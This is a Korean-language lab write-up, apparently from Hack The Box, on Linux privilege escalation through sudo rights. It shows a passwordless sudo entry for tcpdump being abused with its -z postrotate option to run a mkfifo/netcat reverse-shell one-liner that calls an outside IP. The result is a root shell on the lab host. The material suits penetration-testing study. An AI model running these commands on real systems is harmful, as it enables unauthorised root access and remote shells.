# Sudo Rights Abuse

sudo 명령이 전송되면, 시스템은 명령어를 친 유저가 적절한 권한을 가지고 있는지 `/etc/sudoers` 와 같은 파일에 설정된 대로 확인한다. 시스템에 도착하자마자 현재 유저는 항상 `sudo -l` 부터 입력하여 sudo 권한이 없는지 확인해야 한다. `NOPASSWD`옵션이 있다면, 패스워드 입력 없이 sudo를 쓸 수 있다.

```powershell
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

위 옵션에서 tcpdump는 postrotate-command 옵션으로 악용 가능하다.

**postrotate-command options**

```powershell
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

**postrotate-command로 실행할 reverse shell one-liner 생성**

```powershell
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

**postrotate-command 로 /tmp/.test 지정**

```powershell
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

**reverse shell 수령 확인**

```powershell
hunji@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```
